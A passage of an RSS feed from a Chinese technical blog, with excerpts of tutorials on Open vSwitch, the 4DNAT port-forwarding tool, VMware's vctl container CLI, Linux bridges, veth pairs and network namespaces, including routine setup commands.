&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>测试&lt;/p></description></item><item><title>Open vSwitch 入门实践（1）Open vSwitch 是什么</title><link>https://www.typesafe.cn/posts/ovs-learn-1/</link><pubDate>Wed, 25 Nov 2020 17:49:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/ovs-learn-1/</guid><description>&lt;h1 id="ovs简介">OVS简介&lt;/h1>
&lt;h3 id="open-vswitch-是什么">Open vSwitch 是什么？&lt;/h3>
&lt;p>Open vSwitch(以下简称OVS)是一个用C语言开发的多层虚拟交换机，使用Apcahe 2开源许可证，现如今基本上已经成为了开源SDN（软件定义网络）基础设施层的事实标准。&lt;/p>
&lt;h3 id="ovs支持哪些功能">OVS支持哪些&lt;a href="http://www.openvswitch.org//features/">功能&lt;/a>？&lt;/h3>
&lt;ul>
&lt;li>支持NetFlow、sFlow(R)、IPFIX、SPAN、RSPAN和GRE隧道镜像等多种流量监控协议&lt;/li>
&lt;li>支持LACP (IEEE 802.1AX-2008)&lt;/li>
&lt;li>支持标准802.1Q VLAN协议，允许端口配置trunk模式&lt;/li>
&lt;li>支持组播&lt;/li>
&lt;li>支持BFD和802.1ag链路监控&lt;/li>
&lt;li>支持STP（IEEE 802.1D-1998）和RSTP（IEEE 802.1D-2004）&lt;/li>
&lt;li>支持细粒度的QoS（服务质量）配置&lt;/li>
&lt;li>支持HFSC qdisc&lt;/li>
&lt;li>支持接管每一个虚拟机的流量&lt;/li>
&lt;li>支持基于源MAC的负载均衡、主备模式和L4哈希的端口绑带&lt;/li>
&lt;li>支持OpenFlow协议（包含了很多对虚拟化的扩展）&lt;/li>
&lt;li>支持IPv6&lt;/li>
&lt;li>支持多种隧道协议（GRE、VXLAN、STT、Geneve和IPsec）&lt;/li>
&lt;li>支持C和Python的远程配置协议&lt;/li>
&lt;li>支持内核和用户空间的转发引擎选项&lt;/li>
&lt;li>具有流缓存引擎的多表转发管道&lt;/li>
&lt;li>转发层抽象以简化向新软件和硬件平台的移植&lt;/li>
&lt;/ul>
&lt;h1 id="ovs的术语解释">OVS的术语解释&lt;/h1>
&lt;h3 id="bridge">Bridge&lt;/h3>
&lt;p>中文名称&lt;strong>网桥&lt;/strong>，一个Bridge代表一个以太网交换机（Switch），一台主机中可以创建一个或多个Bridge，Bridge可以根据一定的规则，把某一个端口接收到的数据报文转发到另一个或多个端口上，也可以修改或者丢弃数据报文。&lt;/p>
&lt;h3 id="port">Port&lt;/h3>
&lt;p>中文名称&lt;strong>端口&lt;/strong>，需要注意的是它和TCP里面的端口不是同样的概念，它更像是物理交换机上面的插口，可以接水晶头的那种。Port隶属于Bridge，必须先添加了Bridge才能在Bridge上添加Port。Port有以下几种类型：&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>Normal&lt;/strong>&lt;/p>
&lt;p>用户可以把操作系统中已有的网卡添加到Open vSwicth上，Open vSwitct会自动生成一个同名的Port开处理这张网卡进和出的数据报文。&lt;/p>
&lt;blockquote>
&lt;p>不过需要注意的是这种方式添加的Port不支持分配IP地址，如果之前网卡上配置的有IP，挂载到OVS上面之后将不可访问。此类型的Port常用于VLAN模式的多台物理主机相连的那个口，交换机一端属于Trunk模式。&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Internal&lt;/strong>&lt;/p>
&lt;p>当Port的类型是Internal时，OVS会自动创建一个虚拟网卡（Interface），此端口收到的数据报文都会转发给这块网卡，从这块网卡发出的数据报文也会通过Port交给OVS处理。当OVS创建一个新的网桥时，会自动创建一个与网桥同名的Internal Port，同时也会创建一个与网桥同名的Interface，因此可以通过ip命令在操作系统中查看到这张虚拟网卡，但是状态是down的。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Patch&lt;/strong>&lt;/p>
&lt;p>Patch Port和veth pair功能相同，总是成双成对的出现，在其中一端收到的数据报文会被转发到另一个Patch Port上，就像是一根网线一样。Patch Port常用于连接两个Bridge，这样两个网桥就和一个网桥一样了。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Tunnel&lt;/strong>&lt;/p>
&lt;p>OVS 支持 GRE、VXLAN、STT、Geneve和IPsec隧道协议，这些隧道协议就是overlay网络的基础协议，通过对物理网络做的一层封装和扩展，解决了二层网络数量不足的问题，最大限度的减少对底层物理网络拓扑的依赖性，同时也最大限度的增加了对网络的控制。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="interface">Interface&lt;/h3>
&lt;p>（iface/接口）接口是OVS与操作系统交换数据报文的组件，一个接口即是操作系统上的一块网卡，这个网卡可能是OVS生成的虚拟网卡，也有可能是挂载在OVS上的物理网卡，操作系统上的虚拟网卡（TUN/TAP）也可以被挂载在OVS上。&lt;/p>
&lt;h3 id="controller">Controller&lt;/h3>
&lt;p>OpenFlow控制器，OVS可以接收一个或者多个OpenFlow控制器的管理，功能主要是下发流表，控制转发规则。&lt;/p>
&lt;h3 id="flow">Flow&lt;/h3>
&lt;p>流表是OVS进行数据转发的核心功能，定义了端口之间转发数据报文的规则，一条流表规则主要分为匹配和动作两部分，匹配部分决定哪些数据报文需要被处理，动作决定了匹配到的数据报文该如何处理。&lt;/p>
&lt;h1 id="ovs常用操作">OVS常用操作&lt;/h1>
&lt;h3 id="安装">安装&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>yum install openvswitch
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>systemctl enable openvswitch
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>systemctl start openvswitch
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;blockquote>
&lt;p>如果当前软件源中没有openvswitch，可以通过&lt;a href="https://developer.aliyun.com/packageSearch?word=openvswitch">阿里云官方镜像站&lt;/a>下载和操作系统版本对应的rpm包到本地再安装。 示例命令： &lt;code>yum localinstall openvswitch-2.9.0-3.el7.x86_64.rpm&lt;/code>&lt;/p></description></item><item><title>服务器不允许上网并且需要跳板机才能访问？学会使用这个工具，轻松让服务器使用yum。</title><link>https://www.typesafe.cn/posts/4dnat/</link><pubDate>Thu, 19 Nov 2020 22:33:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/4dnat/</guid><description>&lt;h1 id="前言">前言&lt;/h1>
&lt;p>你是否遇到过这样的场景，服务器不能上网，但是又需要安装某个软件，面对如蛛网般杂乱的rpm包依赖关系，放弃或许是最好的选择，这样你就不必再为无法完成工作而痛苦又懊恼。&lt;/p>
&lt;p>但是今天，你有了一个更好的选择。&lt;/p>
&lt;h1 id="4dnat">&lt;a href="https://github.com/dushixiang/4dnat">4DNAT&lt;/a>&lt;/h1>
&lt;p>4DNAT取名源自4和DNAT。这个工具工作在OSI模型的第四层传输层，同时4和for谐音，意为专门为目标地址转换而服务的工具。4DNAT使用go语言开发，具有天然的跨平台性，并且完全使用go标准库开发，没有任何的第三方依赖，编译之后只有一个二进制可执行文件。它有4种工作模式：&lt;/p>
&lt;h3 id="转发模式">转发模式&lt;/h3>
&lt;p>接受两个参数，监听端口和目标地址，在监听端口接收到请求后会主动连接目标地址，示例：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>./4dnat -forward &lt;span style="color:#ae81ff">2222&lt;/span> 192.168.1.100:22
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="监听模式">监听模式&lt;/h3>
&lt;p>接受两个参数，监听端口1和监听端口2，并交换两个端口接收到的数据，示例：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>./4dnat -listen &lt;span style="color:#ae81ff">10000&lt;/span> &lt;span style="color:#ae81ff">10001&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="代理人模式">代理人模式&lt;/h3>
&lt;p>接受两个参数，目标地址1和目标地址2，启动后会主动连接这两个目标地址，并交换两个端口接收到的数据，示例：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>./4dnat -agent 127.0.0.1:10000 127.0.0.1:22
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="httphttps代理模式">http/https代理模式&lt;/h3>
&lt;p>接受两个参数或四个参数，代理类型、监听端口、证书路径和私钥路径，示例：&lt;/p>
&lt;h4 id="http代理">http代理&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>./4dnat -proxy http &lt;span style="color:#ae81ff">1080&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="https代理">https代理&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>./4dnat -proxy https &lt;span style="color:#ae81ff">1080&lt;/span> server.crt server.key
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="使用场景">使用场景&lt;/h1>
&lt;h3 id="场景一">场景一&lt;/h3>
&lt;p>期望可以在&lt;strong>用户电脑&lt;/strong>上直接访问目标服务器上的3306端口，跳板机器是一台Windows机器，没办法做ssh端口转发。
&lt;img src="https://oss.typesafe.cn/break-through-the-network.png" alt="请输入图片描述">&lt;/p>
&lt;blockquote>
&lt;p>单向虚线箭头表示可以单向访问，反之不行。&lt;/p>&lt;/blockquote>
&lt;p>使用4DNAT在&lt;strong>跳板机器&lt;/strong>上执行如下命令做端口转发&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 本地监听3307端口，接收到请求后主动连接10.1.0.40的3306端口&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>./4dnat -forward &lt;span style="color:#ae81ff">3307&lt;/span> 10.1.0.40:3306
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在&lt;strong>用户电脑&lt;/strong>上访问&lt;strong>172.16.0.30:3307&lt;/strong>即等同于访问&lt;strong>10.1.0.40:3306&lt;/strong>，于是就可以在&lt;strong>用户电脑&lt;/strong>愉快的访问&lt;strong>目标机器&lt;/strong>上的服务啦。&lt;/p>
&lt;h3 id="场景二">场景二&lt;/h3>
&lt;p>期望目标&lt;strong>目标机器&lt;/strong>可以上网，如使用yum安装软件。
&lt;img src="https://oss.typesafe.cn/break-through-the-network2.png" alt="请输入图片描述">&lt;/p>
&lt;ol>
&lt;li>在&lt;strong>用户电脑&lt;/strong>上开启一个http代理&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>./4dnat -proxy http &lt;span style="color:#ae81ff">1080&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>在&lt;strong>跳板机器&lt;/strong>上使用监听模式监听两个端口，用于交换数据&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>./4dnat -listen &lt;span style="color:#ae81ff">10000&lt;/span> &lt;span style="color:#ae81ff">10001&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
&lt;li>在&lt;strong>目标机器&lt;/strong>上使用监听模式监听两个端口，用于交换数据&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>./4dnat -listen &lt;span style="color:#ae81ff">20000&lt;/span> &lt;span style="color:#ae81ff">20001&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="4">
&lt;li>在&lt;strong>用户电脑&lt;/strong>上使用代理人模式主动连接两个目标地址，用于交换数据&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>./4dnat -agent 127.0.0.1:1080 172.16.0.30:10000
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="5">
&lt;li>在&lt;strong>跳板机器&lt;/strong>上使用代理人模式主动连接两个目标地址，用于交换数据&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>./4dnat -agent 127.0.0.1:10001 10.1.0.40:20000
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="6">
&lt;li>在&lt;strong>目标机器&lt;/strong>上修改代理&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>cat &lt;span style="color:#e6db74">&amp;lt;&amp;lt;EOF &amp;gt;&amp;gt; /etc/profile
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">http_proxy=http://127.0.0.1:20001
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">https_proxy=http://127.0.0.1:20001
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">export http_proxy https_proxy
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">EOF&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>source /etc/profile
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="7">
&lt;li>在&lt;strong>目标机器&lt;/strong>上测试访问互联网&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl https://typesafe.cn
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>最后奉上项目地址 &lt;a href="https://github.com/dushixiang/4dnat">https://github.com/dushixiang/4dnat&lt;/a>&lt;/p></description></item><item><title>Docker？Vmware？小孩子才做选择，打工人我全都要。</title><link>https://www.typesafe.cn/posts/docker-on-vmware/</link><pubDate>Tue, 17 Nov 2020 15:39:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/docker-on-vmware/</guid><description>&lt;h1 id="前言">前言&lt;/h1>
&lt;p>作为一个称职的打工人，电脑上常备一个Vmware不是什么新鲜事了，但是它和Docker for Windows不兼容往往很让人头大。通过查找资料，发现提供的解决方案大致有三种&lt;/p>
&lt;ol>
&lt;li>先使用Vmware创建一台Linux虚拟机，在这台Linux虚拟机上再安装docker。&lt;/li>
&lt;li>配置Vmware作为Docker for Windows的运行平台。&lt;/li>
&lt;li>使用微软的Hyper-v来创建虚拟机。&lt;/li>
&lt;/ol>
&lt;p>对我而言，第一种不太优雅，第二种配置繁琐，第三种不会用。&lt;/p>
&lt;p>直到我发现了vctl这个好东西。&lt;/p>
&lt;h1 id="vctl-是什么">vctl 是什么？&lt;/h1>
&lt;blockquote>
&lt;p>vctl 是一款捆绑在Vmware Workstation Pro 应用程序中的命令行实用程序，仅在 Windows 10 1809 或更高版本上受支持。如果 Workstation Pro 所在主机上的 Windows 操作系统低于 Windows 10 1809，则它不支持 vctl CLI。&lt;/p>&lt;/blockquote>
&lt;p>简单来说它就是Vmware上的一个工具，可以用它来管理容器，使用命令基本上和docker一致，只需要把&lt;code>docker &amp;lt;cmd&amp;gt;&lt;/code>换成&lt;code>vctl &amp;lt;cmd&amp;gt;&lt;/code>就足够了。Docker for Windows？不需要。现在容器都交给vctl来管理了。&lt;/p>
&lt;p>在使用vctl命令前，和启动docker一样，需要先启动vctl的守护进程。&lt;/p>
&lt;pre tabindex="0">&lt;code>vctl system start
&lt;/code>&lt;/pre>&lt;p>当需要关闭守护进程时执行&lt;/p>
&lt;pre tabindex="0">&lt;code>vctl system stop
&lt;/code>&lt;/pre>&lt;p>接下来就是和普通的docker命令一样了。&lt;/p>
&lt;pre tabindex="0">&lt;code># 拉取镜像
vctl pull nginx

# 查看镜像
vctl images

# 启动容器
vctl --name some-nginx -d -p 8080:80 nginx

# 查看容器
vctl ps

# 进入容器
vctl exec -it &amp;lt;cid&amp;gt; bash 
&lt;/code>&lt;/pre>&lt;p>更多使用信息可参考Vmware的官方文档 &lt;a href="https://docs.vmware.com/cn/VMware-Fusion/11/com.vmware.fusion.using.doc/GUID-78E7339F-7294-4F3E-9AD0-1E14C201FA40.html">使用vctl命令管理容器&lt;/a>&lt;/p></description></item><item><title>Linux Bridge 详解</title><link>https://www.typesafe.cn/posts/linux-bridge/</link><pubDate>Fri, 13 Nov 2020 21:47:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/linux-bridge/</guid><description>&lt;h1 id="linux-bridge-详解">Linux Bridge 详解&lt;/h1>
&lt;p>Linux Bridge（网桥）是用纯软件实现的虚拟交换机，有着和物理交换机相同的功能，例如二层交换，MAC地址学习等。因此我们可以把tun/tap，veth pair等设备绑定到网桥上，就像是把设备连接到物理交换机上一样。此外它和veth pair、tun/tap一样，也是一种虚拟网络设备，具有虚拟设备的所有特性，例如配置IP，MAC地址等。&lt;/p>
&lt;p>Linux Bridge通常是搭配KVM、docker等虚拟化技术一起使用的，用于构建虚拟网络，因为此教程不涉及虚拟化技术，我们就使用前面学习过的netns来模拟虚拟设备。&lt;/p>
&lt;h2 id="如何使用linux-bridge">如何使用Linux Bridge？&lt;/h2>
&lt;p>操作网桥有多种方式，在这里我们介绍一下通过&lt;strong>bridge-utils&lt;/strong>来操作，由于它不是Linux系统自带的工具，因此需要我们手动来安装它。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># centos&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>yum install -y bridge-utils
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># ubuntu&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>apt-get install -y bridge-utils
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>使用&lt;code>brctl help&lt;/code>查看使用帮助&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>never heard of command &lt;span style="color:#f92672">[&lt;/span>help&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Usage: brctl &lt;span style="color:#f92672">[&lt;/span>commands&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>commands:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	addbr 	&amp;lt;bridge&amp;gt;		add bridge
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	delbr 	&amp;lt;bridge&amp;gt;		delete bridge
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	addif 	&amp;lt;bridge&amp;gt; &amp;lt;device&amp;gt;	add interface to bridge
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	delif 	&amp;lt;bridge&amp;gt; &amp;lt;device&amp;gt;	delete interface from bridge
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	hairpin 	&amp;lt;bridge&amp;gt; &amp;lt;port&amp;gt; &lt;span style="color:#f92672">{&lt;/span>on|off&lt;span style="color:#f92672">}&lt;/span>	turn hairpin on/off
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setageing 	&amp;lt;bridge&amp;gt; &amp;lt;time&amp;gt;		set ageing time
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setbridgeprio	&amp;lt;bridge&amp;gt; &amp;lt;prio&amp;gt;		set bridge priority
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setfd 	&amp;lt;bridge&amp;gt; &amp;lt;time&amp;gt;		set bridge forward delay
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	sethello 	&amp;lt;bridge&amp;gt; &amp;lt;time&amp;gt;		set hello time
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setmaxage 	&amp;lt;bridge&amp;gt; &amp;lt;time&amp;gt;		set max message age
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setpathcost	&amp;lt;bridge&amp;gt; &amp;lt;port&amp;gt; &amp;lt;cost&amp;gt;	set path cost
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setportprio	&amp;lt;bridge&amp;gt; &amp;lt;port&amp;gt; &amp;lt;prio&amp;gt;	set port priority
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	show 	&lt;span style="color:#f92672">[&lt;/span> &amp;lt;bridge&amp;gt; &lt;span style="color:#f92672">]&lt;/span>		show a list of bridges
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	showmacs 	&amp;lt;bridge&amp;gt;		show a list of mac addrs
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	showstp 	&amp;lt;bridge&amp;gt;		show bridge stp info
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	stp 	&amp;lt;bridge&amp;gt; &lt;span style="color:#f92672">{&lt;/span>on|off&lt;span style="color:#f92672">}&lt;/span>	turn stp on/off
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>常用命令如&lt;/p></description></item><item><title>Linux veth pair 详解</title><link>https://www.typesafe.cn/posts/linux-veth-pair/</link><pubDate>Mon, 09 Nov 2020 22:45:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/linux-veth-pair/</guid><description>&lt;h1 id="linux-veth-pair-详解">Linux veth pair 详解&lt;/h1>
&lt;p>veth pair是成对出现的一种虚拟网络设备接口，一端连着网络协议栈，一端彼此相连。如下图所示：&lt;/p>
&lt;p>&lt;img src="https://oss.typesafe.cn/virtual-device-veth-1.png" alt="virtual-device-veth-1">&lt;/p>
&lt;p>由于它的这个特性，常常被用于构建虚拟网络拓扑。例如连接两个不同的网络命名空间(netns)，连接docker容器，连接网桥(Bridge)等，其中一个很常见的案例就是OpenStack Neutron底层用它来构建非常复杂的网络拓扑。&lt;/p>
&lt;h2 id="如何使用">如何使用？&lt;/h2>
&lt;p>创建一对veth&lt;/p>
&lt;pre tabindex="0">&lt;code>ip link add &amp;lt;veth name&amp;gt; type veth peer name &amp;lt;peer name&amp;gt;
&lt;/code>&lt;/pre>&lt;h2 id="实验">实验&lt;/h2>
&lt;p>我们改造上一节完成的netns实验，使用veth pair将两个的隔离netns连接起来。如下图所示：&lt;/p>
&lt;p>&lt;img src="https://oss.typesafe.cn/vethpair.png" alt="https://oss.typesafe.cn/vethpair.png">&lt;/p>
&lt;p>我们首先创建一对veth设备，将veth设备分别移动到两个netns中并启动。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 创建一对veth&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link add veth0 type veth peer name veth1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 将veth移动到netns中&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link set veth0 netns ns0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link set veth1 netns ns1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 启动&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns exec ns0 ip link set veth0 up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns exec ns1 ip link set veth1 up
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>接下来我们测试一下。&lt;/p></description></item><item><title>Linux Network Namespace (netns) 详解</title><link>https://www.typesafe.cn/posts/linux-netns/</link><pubDate>Sun, 08 Nov 2020 23:12:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/linux-netns/</guid><description>&lt;p>Network Namespace （以下简称netns）是Linux内核提供的一项实现网络隔离的功能，它能隔离多个不同的网络空间，并且各自拥有独立的网络协议栈，这其中便包括了网络接口（网卡），路由表，iptables规则等。例如大名鼎鼎的docker便是基于netns实现的网络隔离，今天我们就来手动实验一下netns的隔离特性。&lt;/p>
&lt;h3 id="使用方式">使用方式&lt;/h3>
&lt;p>使用&lt;code>ip netns help&lt;/code>查看使用帮助&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Usage: ip netns list
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip netns add NAME
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip netns set NAME NETNSID
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip &lt;span style="color:#f92672">[&lt;/span>-all&lt;span style="color:#f92672">]&lt;/span> netns delete &lt;span style="color:#f92672">[&lt;/span>NAME&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip netns identify &lt;span style="color:#f92672">[&lt;/span>PID&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip netns pids NAME
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip &lt;span style="color:#f92672">[&lt;/span>-all&lt;span style="color:#f92672">]&lt;/span> netns exec &lt;span style="color:#f92672">[&lt;/span>NAME&lt;span style="color:#f92672">]&lt;/span> cmd ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip netns monitor
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip netns list-id
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="开始实验">开始实验&lt;/h3>
&lt;p>我们将要构建如下图的网络&lt;/p>
&lt;p>&lt;img src="https://oss.typesafe.cn/netns.png?t=2" alt="https://oss.typesafe.cn/netns.png">&lt;/p>
&lt;p>首先我们添加两个tap设备并配置上IP信息，然后添加两个netns，最后将tap设备移动到netns中&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 添加并启动虚拟网卡tap设备&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip tuntap add dev tap0 mode tap 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip tuntap add dev tap1 mode tap 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link set tap0 up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link set tap1 up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 配置IP&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip addr add 10.0.0.1/24 dev tap0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip addr add 10.0.0.2/24 dev tap1
